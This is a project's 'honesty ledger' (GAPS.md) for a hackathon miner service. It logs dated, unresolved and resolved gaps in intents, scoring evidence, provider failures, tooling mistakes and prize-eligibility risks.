# GAPS.md — honesty ledger

## 2026-09-13 ten-intent expansion — G118–G125

- **G118 — Ten intents are built, tested and on a preview, and on neither production nor
  the chain.** CRYPTO_PRICE, STOCK_PRICE, URL_SCAN, WEB_SEARCH, CONTENT_VERIFICATION,
  SENTIMENT_ANALYSIS, TEXT_CLASSIFICATION, RESEARCH_SYNTHESIS, CROSS_CHAIN_STATE_VERIFY and
  EVENT_OUTCOME_RESOLUTION. Evidence: 36/36 correctness gate against a local build of the
  commit, 30/30 checks through `vercel curl` on preview `miner-a75zgw1dl` from Vercel
  egress. Production is still `miner-5dc00iohh`, registration 1379 still declares 26.
  **Two of the ten can never rank as things stand:** CROSS_CHAIN_STATE_VERIFY and
  EVENT_OUTCOME_RESOLUTION have no champion scorer (`/api/wasm` count 0, 2026-09-12), so
  nothing is scored there. Built because the operator named them. `OPEN`.
- **G119 — Two relaxed parameters, and a diff tool that cannot see requiredness.**
  `/cve`'s `cve_id` and `/tx-lookup`'s `hash` moved from required to optional, because both
  routes now answer questions that carry neither (year and keyword CVE questions; address
  activity). That the required flag kept the router from sending those questions is
  **inferred, not measured**. `manifest-diff.mjs` compares parameter names only, so it
  reported both endpoints "unchanged". Relaxing cannot invalidate a call that was valid
  before, but the tool's PASS does not cover it. `OPEN` (tool gap).
- **G120 — Keyless providers the new intents lean on, and how each fails.** CoinGecko's
  keyless tier returned 429 after about a dozen calls in one session; CRYPTO_PRICE name
  search and history degrade to Coinbase or Kraken or to an honest outage. Polymarket
  refuses this laptop (HTTP 000 in 0.02 s) but answers Vercel, so EVENT_OUTCOME can only be
  live-tested from a preview. Yahoo's chart endpoint needs a browser user agent. NVD allows
  five anonymous requests per thirty seconds. URLhaus is a 1.1 MB list fetched and cached.
  Every one reports an outage as an outage, verified with stubbed failures. `OPEN`.
- **G121 — WEATHER_CHECK's current-conditions fix is not bench-validated.** "What is the
  current temperature in Cairo?" was answered on production with a 24-hour range. It now
  gets Open-Meteo's 15-minute `current` reading, and hours=0 no longer forecasts an hour.
  The reg-510 bench was invalid (12/20 on the bench, 0 of 9 live epochs), so this rests on
  what both crossing competitors answer — a current reading first — not on a score. The
  acceptance test is the next complete epochs. `OPEN`.
- **G122 — ONCHAIN_TX_LOOKUP's reorder is validated, narrowly.** Parties before gas, fee
  before gas price. On the two authored families under which txlens, veyctum and
  chainsight cross (6/4/5 and 6/6/6 of 6) and our old answer does not (0/6), the new answer
  crosses 12/12; reproduced 2026-09-13 from answers regenerated on the integrated build,
  byte-identical to the lane's. Limits: three Ethereum transactions, authored ground truths
  (G24), and interlock crosses on the bench but never in production, so the bench still
  admits a false positive. `OPEN` until an epoch scores it.
- **G123 — Scope that is declared rather than hidden.** CROSS_CHAIN_STATE_VERIFY verifies a
  bridge message by transaction hash or GUID and refuses state roots, Merkle-Patricia
  proofs and block headers by name. RESEARCH_SYNTHESIS answers the intent's own coffee
  example as `single_source`, because only one indexed study states a quotable finding;
  that shape was not scored under reg 627. SENTIMENT_ANALYSIS uses a hand-written lexicon of
  about 300 words, so text whose opinion words are absent reads neutral. TEXT_CLASSIFICATION
  is lexical. CONTENT_VERIFICATION is a verbatim search of Wikisource and Wikipedia, and a
  miss is stated as not evidence of tampering. `OPEN`.
- **G124 — Independent verification found 17 defects, and the 18th only showed up on
  Vercel.** Each lane's verifier refuted its builder: a fork coin priced as its major, the
  word "link" read as Chainlink, "(USD)" read as a ProShares ticker, an outage reported as
  "no such company", a Fed "hold" resolved against the rate-cut market, Google-owned
  domains flagged as Google lookalikes, a resolver outage producing "safe", a partial
  outage reported as an absence, a clause cut at its inner quote, a statement of purpose
  quoted as a finding, and more. All 17 reproduced fixed on the integrated build. Then
  "The battery died after a week and support never replied" came back POSITIVE on the
  preview, carried by the noun "support", after the lane's tests and its verifier had both
  passed. Fixed: "support" removed, "died" added, and a negated expected action ("never
  replied") scores negative. **A green suite and a passing verifier did not find it;
  asking the deployed thing a real sentence did.** `FIXED`.
- **G125 — One lane broke the no-shell-edits rule once.** Lane 3 ran `sed -i` on
  `synthesis-sources.ts` to change `retmax=6` to `retmax=10`; its own diff against the
  backup showed exactly that one line, and the backup was deleted. Recorded because the
  rule exists for G74/G85/G103. `CLOSED`.

## 2026-09-12 reachable-ceiling round — G112–G115

- **G112 — ONCHAIN_TX_LOOKUP could not read BSC or Avalanche, and denied their
  transactions instead of saying so.** `wallet.ts` has read BSC balances since the
  2026-09-11 repair; `onchain.ts` read five chains and BSC was not among them. A live BNB
  Chain hash, with "on BSC" written in the question, was answered "does not correspond to
  any transaction on ethereum, base, arbitrum, optimism, polygon". Reproduced against
  production 2026-09-12 from the chain head. This is G88 one level up — there the chain
  defaulted wrongly, here it was absent — and it lands in the 0.006 `not_found` band that
  epochs 320 and 324 put us in while the leader crossed at 0.9957. **Fixed.** Chains still
  unread: zkSync, Linea, Scroll, Blast, Gnosis and the non-EVM chains; a hash on any of
  them still gets the enumerated denial.
- **G113 — WEATHER_CHECK's dominant question was answered with a temperature range.**
  "Is there an active storm alert or severe weather warning for X right now?" is 21 of the
  33 routed WEATHER_CHECK questions. The shared `/weather-forecast` endpoint answered it
  with a 24-hour forecast whose every number was true and none of which said whether an
  alert was in effect. **Fixed**, from the same graded risk STORM_ALERT reports so the two
  intents cannot contradict each other. **The honesty limit is real and stated in every
  answer:** we read Open-Meteo, not a national agency's warning feed, so the answer
  describes conditions and never claims an authority has issued nothing. If the epoch's
  hidden ground truth is sourced from an actual warning service, our answer can disagree
  with it while being a correct reading of the forecast.
- **G114 — the ONCHAIN champion is a cliff that a single numeric token can decide, and
  our only instrument for measuring it is invalid.** Probed reg 642 directly on
  2026-09-12: rounding the fee in our own answer from `0.000014097973540575` to
  `0.0000140979` moves the score from 0.0132 to **0.9975**, and appending any further
  number (`Note 7.`) drops it back below, while appending a number-free sentence does not.
  So an 18-significant-digit float — a machine artifact no summariser writes — is a
  plausible reason we never cross. **It was NOT changed, because the measurement cannot be
  trusted:** `candidate-corpus.json`'s ground truths are authored, and **txlens's real
  answer, which crosses at 0.995 in production, scores 0.011 against them**. Tuning our
  fee format to an authored guess that the actual crossing miner fails would be fitting
  noise. `toCoin`'s existing comment argues the opposite case for the transaction VALUE
  and is right about that: a truncated value is the wrong figure. The fee is derived and
  the question is open. Needs a real ground truth to settle, which G24 still withholds.
- **G115 — what txlens answers, recorded because it is the only direct evidence of a
  crossing answer.** Queried live 2026-09-12: "Ethereum transaction 0x6679… sent 0 ETH
  from 0x458f… to 0x51c7… and called contract method selector 0x771d503f in block
  25932902; status success." It carries **no gas, no gas price and no fee**, and writes the
  block without thousands separators. We carry all three plus a token-transfer count. That
  is a difference in what is said, not in what is known, and it is the most concrete lead
  left in this intent — but imitating a competitor's shape on this evidence alone is a bet,
  not a measurement, so nothing was copied.

## 2026-09-12 non-leading-intent sweep — G108–G111

- **G108 — ONCHAIN_TX_LOOKUP refused every question about an ADDRESS, and they are
  five of its thirteen routed questions.** Contract-or-wallet, transaction history,
  "did this address move money", "did it send ETH in the last hour", and one address
  the caller labelled a transaction hash. All five were redirected to
  WALLET_BALANCE_CHECK, which answers none of them, in the intent where we sat at
  ratio 0.012 against a leader on 0.995. Fixed and deployed: routed answer rate
  4/13 → 9/13. The four still refused are correct refusals — a CVE id used as a
  transaction, a truncated hash, and two misrouted prediction-market questions.
- **G109 — three of the five FRAUD_DETECTION paper questions end at an honest
  "unknown", and the routed replay still counts those as refusals.** The paper-fraud
  path answers the two that name a work OpenAlex indexes. The other three name a
  journal ("Experimental Biology and Medicine") or a 2026 paper the index does not
  hold, so they report "no matching work is recorded" rather than a retraction status.
  That is deliberate: looser title matching returned *Proceedings of the Society for
  Experimental Biology and Medicine* and *Advances in Experimental Medicine and
  Biology* for that question — two different journals, either of which would have been
  a confidently wrong subject. The answer rate reads 13/29 → 15/29 for that reason,
  and the real change is larger than the number: three questions moved from "you
  supplied no subject" to an answer that addresses what was asked.
- **G110 — OpenAlex documents ONE of the four indicators these questions ask about.**
  Retraction is recorded; misconduct findings, paper-mill membership and
  predatory-publisher status are not, by OpenAlex or by any keyless source. Every
  paper-fraud answer names the three it did not check, so a clean retraction flag is
  never read as a clean record. If the epoch's hidden ground truth asserts a paper-mill
  finding, our answer will be incomplete rather than wrong — and G81's OpenAlex
  rate-limiting applies to this path too, so a shed request answers "index could not be
  read", which is distinguished from "not retracted".
- **G111 — a score of exactly 0 can be the NODE failing, not the miner.** TVL_LOOKUP
  ranked 11th at epoch 325 with score 0 and `failure_reason` "LLM call for miner
  livecert failed: Post http://127.0.0.1:4000/v1/chat/completions: context deadline
  exceeded" — the node's own request-building LLM timing out. Five such rows appear
  across 327 livecert score rows (CONTENT_EXTRACTION@319, CURRENCY_EXCHANGE@319,
  NEWS_HEADLINES@319, SPORTS_SCORE@323, TVL_LOOKUP@325), hitting a different intent
  each time. **Read `failure_reason` before diagnosing a zero.** TVL scored 0.0059 to
  0.0133 at ranks 3–6 in the four surrounding epochs, so nothing regressed there.
- **G105 is CLOSED.** The six CVE year queries are answered by `cvesurvey.ts` — "CVE
  2015", "CVEs 2010 high priority" and "Look up for latest CVEs" all return an NVD
  survey from production, verified 2026-09-12. One product-keyword class remains
  unanswered ("Will Forgejo fix RCE vulnerability?", two routed questions): a
  vulnerability named by product and type with no CVE id. Not built; NVD keyword search
  would cover it.

## 2026-09-10 routed-refusal sweep — G103–G106

- **G103 — a shell heredoc ate a backslash for the FOURTH time.** `/s+/` was written
  into extract.ts as `/s+/`, so place names were split on the letter "s" and "Lagos
  Nigeria" became "Lago". G74 and G85 are the same defect; `no-control-bytes.test.ts`
  cannot catch this one, because a MISSING backslash leaves no control byte behind. It
  was found by printing the function's output, which is the only thing that has ever
  caught it. **Write source through the Write tool, never through a heredoc.** A second
  self-inflicted variant the same session: `String.replace` treats `$` followed by a
  backtick in the REPLACEMENT string as "everything before the match", which spliced
  half of extract.ts into a comment. Use a replacer function for any patch script.
- **G104 — the CURRENCY_EXCHANGE counter currency is an assumption, not a reading.**
  "whats the fx rate of euro?" is answered as EUR/USD because that is what an
  unqualified FX quote means. If the epoch's hidden ground truth quotes the euro
  against something else, the answer is wrong rather than merely incomplete. The
  previous behaviour — refusing — scored ~1e-11 for certain, so the bet is
  directionally right, but it IS a bet and the prose names both currencies so a reader
  can see it. Unverifiable while `/scores` publishes no ground truths (G24).
- **G105 — CVE_LOOKUP refuses six legitimate year queries, and it is the largest
  remaining refusal class in an intent we hold at 1.0.** "CVE 2015", "CVEs 2010 high
  priority", "Criticial CVE 2025", "Look up for latest CVEs" and two more are 6 of the
  21 routed CVE questions. NVD 2.0 can answer them with `cvssV3Severity` plus a
  published-date range, but it caps a range at 120 days, so a whole year needs several
  calls inside a 6 s budget. Not attempted this session: the epoch was overdue and a
  speculative new provider path is the wrong thing to ship into a scoring window.
- **G106 — SPORTS_SCORE and TEXT_AUTHENTICITY_CHECK have never been measured against
  real traffic.** Neither appears once in 3,000 rows of the routed-question feed, so
  the only evidence for either is the authored correctness case in
  `intent-answers.mjs`. Both are among the seven intents that will be scored for the
  first time in the next epoch. Their fields are near-zero, so a refusal would probably
  still rank first — but "probably" is the honest word.
- **G107 — the explorer's question feed is degraded and the replay tool now works
  around it.** `limit=100` returns HTTP 502 or hangs past 45 s; `limit=50` answers in
  about three seconds. The tool pages at 50 with three retries and stops only after
  three consecutive dead pages. If a future session sees "Feed returned no usable
  questions", check the page size before concluding the feed is gone.

## 2026-09-11 wallet repair — G102

**G102 — Wallet token, network and RPC coverage, deployed and accepted.** Seven direct production
queries reproduce failures: USDC/USDT answered with native ETH, BSC answered with Ethereum,
structured chain precedence and chain-ID loss, bridged-token substitution, and invented zero for
invalid addresses. Ten initial regression cases failed; the repaired implementation and three
additional cases pass. Full suite: 474/474; eight live provider checks pass. Token quantities use
issuer-listed contracts; RPC races have shared deadlines and cancellation. Details and remaining
coverage gaps: [current rank report](track1-miner/docs/RANK1_PROGRESS_2026-09-11.md).
The active 26-intent YAML description is unchanged; these runtime additions use its existing query
input. Wallet rank improvement is unverified; epoch 321 still has 8 total rank-1 intents.
Production `miner-kb0aad6hx` passes seven wallet probes and all **7/7 preflight gates**, including
26/26 intent correctness. The public registered alias is accessible; the secondary project alias
requires authentication and its USDC response was verified through `vercel curl`.

## 2026-09-10 third release — G100

**G100 — News relevance and future publications, preview verified.** Company-name substrings and
publisher names could make unrelated articles pass, accented titles were missed, and future-dated
items could count as past-day coverage. Four reproduced failures now pass; full suite 394/394.
Normalized headline words preserve plurals/possessives and publisher identity remains provenance.
Preview Apple and ECB searches both return five relevant articles. Production release is underway.
Remaining: accented query tokenization, syndicated duplicates, and the ordering description.

## 2026-09-10 fourth release — G101

**G101 — SSL target normalization, deployed.** Natural-language URL inputs discarded explicit ports;
bracketed IPv6, trailing-dot FQDN, and punycode targets were rejected. Normalization now preserves
ports and accepts those legal host forms while the public DNS/address guard remains mandatory.
Targeted tests are 74/74. The IPv6 production probe is `unreachable` because the remote address did
not provide a certificate from the deployment environment; this is not converted into a valid claim.

## 2026-09-10 second release — G98–G99

- **G98 — Extraction category and payload corruption, deployed and accepted.** All six reproduced
  failures now pass: instruction/payload separation, multiple categories, quoted apostrophes,
  structured text precedence, comma-currency cents, and month/year false dates. Entity extraction
  remains heuristic. See the rank-1 report and `extraction-coverage.test.ts`.
- **G99 — Weather time, missing data, and cache identity, deployed and accepted.** Current-hour requests
  selected the next hour; storm zero became a 48-hour window; duration aliases shared cache entries;
  stale/null data and unavailable future points produced misleading values. Eight reproduced failures
  pass after fixes. Current weather still uses a modelled hourly interval, not a station observation.
  Production `miner-lm6seiqeu` at 05:23 UTC; acceptance by 05:28 UTC. Six targeted production probes
  pass and 19/19 intent correctness passes. The old CVE live test incorrectly required NVD attribution
  for a correct CNA fallback response; after making its assertions source-specific, the failed suite
  gate recheck passes 390/390. All seven gates accepted across initial run and focused recheck.

## 2026-09-10 rank-1 mission — G92–G97

Full evidence and every non-leading intent:
[RANK1_WEAKNESSES_2026-09-10.md](track1-miner/docs/RANK1_WEAKNESSES_2026-09-10.md).
Baseline is complete epoch 320, registration 1378, **3/19 rank-1 positions**. Four production
failures were reproduced and nineteen new regression cases cover the changes. Rank improvement
remains unverified until a complete post-deployment epoch.

**Release accepted:** production `miner-9asqqpg3w`, alias verified; five targeted probes pass;
7/7 preflight gates including all nineteen intents pass; active registration and watch verified.
The locally/preview-verified fixes below are now deployed. Remaining limitations are unchanged.

- **G92 — Transaction chain, precision, and absence claims, fixed locally/preview.** “ETH on Base
  mainnet” selected Ethereum; a receipt exception erased an observed mined transaction; a missing
  JSON-RPC result was treated as null; failed discovery probes supported false global denials;
  six-decimal truncation lost wei. These now preserve explicit chain identity, receipt evidence,
  provider uncertainty, and exact values. Missing modern status is unknown; reverted value movement
  is described as attempted. Cross-chain lookup latency under multiple slow RPCs remains open.
- **G93 — Sports fixture substitution and cache scope, fixed locally/preview.** Production answered
  a March 2025 question with a September 2026 result. Fallback selection now verifies both teams,
  requested date, and competition; structured dates reach lookup; cache keys retain query constraints;
  ISO timestamps are normalized; provider phases run concurrently. Provider reachability and deeper
  fixture coverage remain open; an honest no-match does not establish a competitive answer.
- **G94 — Academic date constraints, fixed locally/preview.** Explicit days widened to entire months,
  ISO ranges were ignored, and retry dropped the date filter. All are corrected. OpenAlex outages
  remain a provider limitation. A prior test encoded filter-dropping as intended behavior and was
  corrected to require the filter on both attempts.
- **G95 — TVL chain scope and rate-limit classification, fixed locally/preview.** Production returned
  Aave's global $18.15B for a Base-only question; the correct Base subtotal at verification was $517.75M.
  Protocol lookups now read exact `currentChainTvls` chain keys and exclude borrowed/staking categories.
  Rate limits are availability failures rather than proof of missing data. TVL's live value changes;
  these figures are dated evidence, not a prediction of a scorer result.
- **G96 — CVE provider dependence, fixed locally/preview.** NVD failure now tries the public CVE
  Program record API within the watchdog budget. Matching ID, CNA, publication status, CVSS, and
  affected versions are checked; wrong IDs and unaffected versions are excluded. Controlled 429/503
  tests pass. Forced NVD failure on Vercel has not been induced, so that exact deployed fallback path
  remains unverified.
- **G97 — Incomplete ranking/replay evidence, fixed tooling; network failure remains open.** Replay
  still listed thirteen intents after registration expanded to nineteen; it now reads the manifest.
  Refresh merges rather than erases evidence. Rank audit verifies registration ownership/YAML and
  preserves failure reasons and champion IDs. Epoch-319 CONTENT_EXTRACTION and CURRENCY_EXCHANGE
  zeros were node request-builder LLM timeouts before calling the miner. They must not be reported
  as our endpoint outages or as repaired by this batch. Epoch 320 content extraction is an all-zero
  field with no failure detail. Hidden fixtures prevent asserting its cause.

What we do not know, have not verified, or have deliberately left undone. Feeds the README's
"Assumptions & Limitations" and stops unknowns from being quietly rounded to "fine."

Status: `OPEN` unresolved · `CHECKING` in progress · `CLOSED` resolved, with the answer

---

## Blocking

### G1 · Which intent to claim — `CLOSED: SSL_VERIFICATION`
Decided on occupancy **and scoring tier** → [track1-miner/docs/INTENT_OCCUPANCY.md](track1-miner/docs/INTENT_OCCUPANCY.md).
Tier A (exact match), 3 incumbents, all three with exploitable weaknesses. The zero-occupancy
intents turned out to be Tier B (LLM-judged) and were rejected for it.


### G2 · Runtime for TLS inspection — `CLOSED: Node, not Workers`
Confirmed by spike: Workers' `fetch` does not expose peer certificates; Node's
`tls.connect()` + `getPeerCertificate()` does, and was verified working against the full
badssl.com suite (valid, expired, self-signed, hostname-mismatch, untrusted-root, unreachable).
Hosting is therefore Node on an always-on machine — `fly.toml` pins `min_machines_running = 1`
precisely because scale-to-zero would read as spot-check failure (A3).

### G3 · Assumption that weather would be crowded — `CLOSED (confirmed)`
`WEATHER_CHECK` 8 miners, `WEATHER_FORECAST` 9 — among the most contested on the board. The
"avoid the docs' example" thesis holds.

Recorded alongside it: the **`ONCHAIN_TX_LOOKUP` suggestion was wrong** — 10 miners, tied
second-most crowded. Picking by domain familiarity would have bought a rank-4 zero. Crypto-native
intents are where crypto-native entrants cluster.

## Unverified protocol facts

### G4 · How answers are scored — `CLOSED (and the original answer was wrong)`
Scoring is a sandboxed WASM module receiving **three plain strings** — `question`, `ground_truth`,
`miner_answer` — and returning an f32 in [0,1]. That much held.

**Both conclusions drawn from it were wrong, and measurement killed them (2026-08-27):**

- *"Verbose answers are penalised, so keep `reason` terse."* Wrong. Fuller answers win, provided
  every added fact was asked for. Naming the ISP in a geolocation answer moved it 0.0103 → 0.9936.
  Trimming the SSL answer on the terseness premise cost 11% and was reverted.
- *"The champion module is not published, so this is inference, not fact."* Wrong. Every intent's
  champion is listed at `/api/wasm` as commit-pinned WASM, and `/scores?intent=X` returns the real
  questions, ground truths and the exact `converted_answer` that was scored. Running the champion
  locally **reproduces the reported score exactly** — we matched all 8 epoch-286 scores. It is now
  fact, and it is our main tool.

One correction that matters more than either: the scorer reads **`converted_answer`**, Telegraph's
prose conversion of our JSON — not the raw JSON and not `label_field`.

Superseded scoring model: `track1-miner/tools/score-sim.mjs` encodes the dead terseness theory. Do
not use it. Use `tools/bench-champion.mjs`.

### G5 · `example-miner.yaml` — `CLOSED (does not exist where the docs say)`
Not in `telegraph-usecases` — that repo contains six reference **Track 3 applications**, not miner
YAMLs. `telegraph-examples`, cited in the scoring-module docs, returns 404. The file may be
private or unpublished.

Mitigated: `miner.yaml` was written against the field reference and passes a local strict-schema
precheck (top-level keys, `endpoints[]` keys, `signal_mapping` keys, slug pattern, base_url scheme).
The authoritative check remains the sandbox at integrate.telegraphprotocol.com before we spend gas.

### G6 · Truncated doc pages — `OPEN`
Both [YAML Configuration] and [Registering as a Miner] were read at a character cap and cut off
mid-section — the tail of the validation-failures table and the troubleshooting table respectively.
Something in the cut region may matter.
**Resolve:** re-read the tails, or pull the markdown from the docs repo.

### G7 · Base Sepolia access — `CLOSED`
Wallet funded (0.005 ETH), registration sent and confirmed, miner active. The console handled RPC,
so no Alchemy key was ever needed.

### ~~G7 (original)~~ — `OPEN`
Registration needs an RPC endpoint (docs show Alchemy) and testnet ETH for gas. Neither exists yet.
Also unverified: whether the web console handles RPC itself, making this moot for the console path.

## Deliberately out of scope

### G8 · Track 2 and Track 3 — `CLOSED (excluded)`
Script Author and Application tracks are not being attempted in H1. Recorded so the choice reads as
a decision rather than an oversight. Track 3 opens Aug 31 and needs live miners; revisit for H2.

### G9 · `on_chain` block omitted — `CLOSED (excluded)`
Per ARCHITECTURE A9. Cost: our miner **cannot be targeted by ERC-8183 on-chain jobs at all** — the
node has no way to build the call without `on_chain.request`. We serve HTTP and WebSocket traffic
only. Accepted for H1; this is a real capability we are giving up, not a no-op.

### G10 · Monitoring — `CLOSED, with a corrected residual`
`tools/watch.mjs` polls both our endpoint and `/api/miners/<registrationId>`; exits non-zero on a
terminal rejection. `.github/workflows/uptime.yml` runs it from outside our machine and opens an
issue on failure — the rules require the miner live through Sep 7, and a closed laptop is not a
monitoring strategy. `tools/verify-deploy.mjs` gates registration on a full acceptance pass and
was re-run green against production on 2026-08-29 (exit 0, median 372ms, p95 1172ms).

**Residual — and the earlier number here was wrong.** This entry claimed "15-minute polling …
unnoticed for up to 15 minutes". The workflow has since been changed to an hourly cron precisely
because GitHub throttles schedules, and the *observed* cadence is slower still. Measured gaps
are in **G21**, which supersedes this paragraph.

## Process risks

### G11 · Judging weights social reach, and we have no plan yet — `OPEN`
Every track lists "Progress updates posted on X" and "Engagement & reach on those posts" as
criteria. Track 1 additionally counts "number of applications built on your Miner" and "total
requests served" — both demand-side, neither controlled by code quality.
[docs/BUILD_IN_PUBLIC.md](docs/BUILD_IN_PUBLIC.md) sketches a cadence; it is not being executed yet.
**Honest read:** this is the part most likely to be neglected and it is weighted like the rest.

### G12 · Hackathon rules — `CLOSED` → [docs/JUDGING.md](docs/JUDGING.md)
Worth having read early: it corrected our deadline by a week (Track 1 closes **Aug 31**, not Sep 7),
revealed the exact scoring split (**75% performance / 25% X**), and surfaced G13 below.

### G13 · Intent may not be prize-eligible — `OPEN, mitigated two ways` · **highest-severity risk**

**Sharpened 2026-08-26 by live data:** `SSL_VERIFICATION` has **17 lifetime requests** across the
whole network. The 100-request floor is not a formality there — it is most likely unreachable
without manufacturing the traffic ourselves. Mitigated by breadth: the miner now also serves **`STORM_ALERT`** (334 requests, 3 miners) and
**`WEATHER_FORECAST`** (941 requests — the network's highest — 9 miners, all scoring under 0.008),
giving three independent eligibility paths instead of one. See [docs/MARKET_DATA.md](track1-miner/docs/MARKET_DATA.md).

> An Intent must have at least 3 active Miners **and receive at least 100 real requests from
> Track 3 applications** to be eligible for global cash prizes.

`SSL_VERIFICATION` clears the first condition (4 miners once we register). The second is
**entirely outside our control**: it depends on other people choosing to build applications that
check SSL certificates. We can hold rank 1 with a flawless score and win nothing.

**Mitigation built:** [app/](track3-certwatch/) — CertWatch, a TLS expiry monitor. It uses the **auto-routed**
engine endpoint so Telegraph's own router classifies each query, meaning demand lands on the intent
rather than being aimed at our miner. It counts `SSL_VERIFICATION`-classified requests separately.
Bounded honestly per rule 04: a certificate monitor has a real reason to check certificates
repeatedly, and being routed to a competitor is an accepted outcome.

**Residual risk:** 100 requests may still not be reachable from one app used by one person, and
**self-generated demand is the weakest kind** — the rules say requests must come "from Track 3
applications", which we satisfy literally, but the spirit is real adoption. Getting other people to
use CertWatch (T4b.4) matters more than running it ourselves. We also still cannot verify the
current per-intent count — no public counter has been found. This remains the single most likely
way the project produces excellent work and zero prize.

**Measured again 2026-08-29 — both halves confirmed, neither improving.**

```
intent                 miners   floor
SSL_VERIFICATION          5     OK
STORM_ALERT               6     OK
WEATHER_FORECAST         12     OK
IP_GEOLOCATION            2     BELOW 3      livecert + iplocate only
LANGUAGE_TRANSLATION      3     OK
ACADEMIC_SEARCH           3     OK

total_requests_served (our registration, all six intents combined): 42
```

Two things that entry did not previously state plainly. The **42** is the miner's lifetime total
across *all six* intents, while the floor is **100 per intent** — so the shortfall is not "58 more
requests", it is roughly 600 across the board, two days before the Aug 31 close, with Track 3 not
yet open. And `IP_GEOLOCATION` fails the *first* half of the rule as well, so our rank 1 there is
worth nothing on its own terms regardless of demand. The operator decided on 2026-08-28 not to
register a second miner from another account; that decision stands and this is its cost, recorded.

**Re-read 2026-09-04 08:30Z against the live rules page and catalog.** The rule is per **intent**,
network-wide: "An Intent must have at least 3 active Miners and receive at least 100 real requests
from Track 3 applications". It is not 100 requests to *our* miner per intent, and it is not something
our miner can satisfy alone. Three facts follow:

1. **Nobody outside the organizers can measure the second half.** The node exposes only
   `total_requests_served` per miner — ours is **415** (57 on 08-30, 132 on 08-31), and it is one
   number across thirteen intents that plausibly includes the node's own scoring calls. Neither
   `/engine/v1/intents` (miner counts only) nor the explorer publishes per-intent request totals.
2. **The first half is now met in twelve of thirteen intents.** `TELEGRAPH_KNOWLEDGE` has **2** active
   miners (livecert, telegraph-chatbot) and fails it outright; every other intent of ours has 3–14.
3. **The only Track 3 demand we can see is Morse's own ledger** (`/api/stats`, 185 calls, 148 ok, 60
   users since 2026-09-02): SSL 23 · WEATHER_CHECK 18 · STORM 14 · NEWS 8 · FACT_CHECK 8 · CONTENT 7 ·
   ACADEMIC 6 · WEATHER_FORECAST 6 · IP 5 · TRANSLATION 4 · AI_TEXT 2 · WALLET 1 · TELEGRAPH_KNOWLEDGE 0.
   No intent is near 100 from Morse alone; other Track 3 apps' traffic is invisible to us. Summing
   `total_requests_served` over each intent's miners gives 424–2,580 per intent, but that is an upper
   bound polluted by scoring calls and multi-intent miners, so it settles nothing.

The lever is unchanged and it is not a miner lever: real people using a real Track 3 app before
Sep 7 23:59 UTC. Rule 04 rules out anything else.

**Re-read 2026-09-07 18:39 UTC — first real per-intent reconstruction, not just an upper bound.**
Point 1 above is softened, not resolved: `total_requests_served` is still the only *official* number
and it is still one figure across all our intents. But the public question feed
(`explorer.telegraphprotocol.com/api/daemon/api/questions`) carries every network-wide `type`
(`direct`/`daemon`) and `routing.subnet_id` row, and cross-referencing that against each miner's
declared `supported_intents` and per-endpoint manifest (`/api/miners`) resolves ~85% of rows to a
single intent. Paged the full Track 3 window, **2026-08-31T00:00:00Z–2026-09-07T23:59:59Z UTC**
(not local date — see the header warning above), 71,200 rows, 0 outside that window:

```
intent                  total    distinct signatures   capped-at-5   ≥100?
WEATHER_CHECK           56,531   113                    265          yes
WALLET_BALANCE_CHECK     2,447   212                     740          yes
STORM_ALERT              1,724   405                   1,160          yes
SSL_VERIFICATION           258   143                     244          yes
FACT_CHECK                 188    79                     150          yes
AI_TEXT_DETECTION          192    67                     126          yes
ACADEMIC_SEARCH            156   104                     154          yes
LANGUAGE_TRANSLATION       135    90                     122          yes
IP_GEOLOCATION              118    98                     118          yes
CONTENT_EXTRACTION          74    50                      73          NO
NEWS_HEADLINES               51    39                      50          NO
```

`auto` (daemon-routed, 70/20/10 split) volume is 0–27 per intent throughout — this floor is being
cleared or missed almost entirely on `direct` (caller-names-the-miner) volume. "Distinct signatures"
is the count of unique (subnet, endpoint, normalized payload) combinations; "capped-at-5" sums
`min(count, 5)` per signature. Both exist because raw totals are heavily inflated by what looks like
shared validator/benchmark replay, not organic Track 3 traffic: WEATHER_CHECK's 56,531 rows are
99.8% the same ~113-question set (led by "cairo", ~2,000+ times each) hit simultaneously across five
unrelated competing miners on a near-identical ~38-second cadence, and the "Attention Is All You
Need" paper is reused as a test fixture across ACADEMIC_SEARCH, LANGUAGE_TRANSLATION,
CONTENT_EXTRACTION and FACT_CHECK — including calls to our own miner, so this isn't one
competitor's self-dealing, it reads as background protocol/benchmark noise hitting the whole network
evenly. Whether the organizers' "real requests from Track 3 applications" count includes that noise
is exactly point 1: unknown, unresolvable from outside.

**Bottom line:** on the most generous reading (raw or capped totals) 9 of our 11 non-weather-forecast,
non-`TELEGRAPH_KNOWLEDGE` intents clear the floor; only `CONTENT_EXTRACTION` and `NEWS_HEADLINES`
are short, and by a wide, stable margin (not a measurement artifact — confirmed on two separate pulls
hours apart). On the harshest reading (distinct signatures only, i.e. assume every repeat is noise),
only 5 clear it: `WEATHER_CHECK`, `SSL_VERIFICATION`, `ACADEMIC_SEARCH`, `WALLET_BALANCE_CHECK`,
`STORM_ALERT`. `IP_GEOLOCATION` sits closest to that harsher line (98, 2 short) and is also the
cleanest-looking intent of the eleven — least repetition, most varied payloads — so if forced to bet
on which borderline intent is genuinely closest to real, it's that one, not `CONTENT_EXTRACTION` or
`NEWS_HEADLINES`. Reproducible via the scratchpad scripts this session built; not yet committed to
this repo as a tool.

### G15 · We published a wrong competitive claim internally — `CLOSED (retracted)`
We asserted across three documents and a draft X post that the rank-1 incumbent was beatable
because Render cold-starts. Measurement: **675ms cold, 324ms warm — no cold start**, because
validators spot-check every ~20s and keep it warm. The competitor also does a real TLS handshake,
so our "handshake vs CT logs" edge applies to `certspotter`, not to them.

Retracted everywhere. Recorded because the failure mode is the point: it was an inference stated
as a fact, repeated until it felt established, and one `curl` disproved it. Measure claims about
competitors **before** they reach a public post.

### G14 · x402 docs are drifted from the shipped SDK — `CLOSED (worked around)`
The docs show `createSigner` from `@x402/evm`; the published package (2.23.0) exports
`toClientEvmSigner(account, publicClient)` instead, and `wrapFetchWithPayment` takes an
`x402Client` built via `x402Client.fromConfig({schemes:[...]})` rather than a bare signer. Also
needs `viem`, which is ESM-only — so the app is ESM while the miner stays CommonJS.
Resolved by reading the shipped `.d.ts` files rather than the docs. Worth remembering: **the
Telegraph docs lag their own SDK**, so verify against the package, not the page.

### G16 · The protocol node is a single point of failure for us — `OPEN`
`devnode.telegraphprotocol.com` was fully unreachable for at least three consecutive 20s probes on
2026-08-26 while our own miner served normally. Everything we depend on for *observability* —
activation status, catalog, intents, scores — runs through that one host, and so does the
registration console.

Implications we cannot engineer away:
- A node outage during the grace period may cost us scored epochs through no fault of ours.
